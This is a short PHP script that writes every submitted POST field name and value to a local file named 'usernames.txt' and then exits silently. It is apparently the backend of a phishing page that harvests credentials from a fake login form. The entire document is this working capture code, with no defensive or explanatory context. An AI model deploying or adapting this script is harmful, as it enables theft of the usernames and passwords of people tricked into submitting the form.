<?php

$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);

   fwrite($handle, $value);

}

fclose($handle);
exit;
?>